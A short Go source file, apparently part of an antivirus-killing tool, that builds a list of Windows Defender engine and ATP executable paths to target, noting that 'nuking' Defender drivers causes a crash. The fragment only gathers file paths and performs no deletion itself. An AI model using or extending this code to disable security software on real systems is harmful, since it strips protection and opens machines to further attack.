package main

import "path/filepath"

var (
	// AV product to vital executables and driver paths mapping
	productList = map[string]func() []string{
		"defender": defender_files,
	}
)

func defender_files() []string {
	var result filescanner
	result.AddIfFound("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\*.exe")      // Windows Defender Engine executables
	result.AddIfFound("C:\\Program Files\\Windows Defender Advanced Threat Protection\\*.exe") // Microsoft Defender ATP Service
	result.AddIfFound("C:\\Program Files\\Windows Defender\\*.exe")                            // Windows Defender Engine executables (built in)

	//Nuking drivers results in BSOD
	//result.AddIfFound("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\Drivers\\*.sys") // Windows Defender Drivers
	// result.AddIfFound("C:\\Windows\\System32\\Drivers\\WD\\*.sys")  // Windows Defender Drivers (built in)
	return result
}

type filescanner []string

func (fs *filescanner) AddIfFound(glob string) {
	files, _ := filepath.Glob(glob)
	if len(files) > 0 {
		*fs = append(*fs, files...)
	}
}
